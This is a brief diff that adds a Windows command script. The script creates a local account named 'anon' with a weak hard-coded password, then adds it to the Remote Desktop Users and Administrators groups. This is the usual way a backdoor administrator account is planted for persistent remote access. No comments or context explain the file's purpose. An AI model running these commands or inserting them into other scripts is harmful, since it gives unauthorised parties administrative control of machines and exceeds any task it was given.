@@ -1,0 +1,7 @@
+net user anon password123!!! /add
+
+
+net localgroup
+net localgroup "Remote Desktop Users" anon /add
+
+net localgroup Administrators anon /add
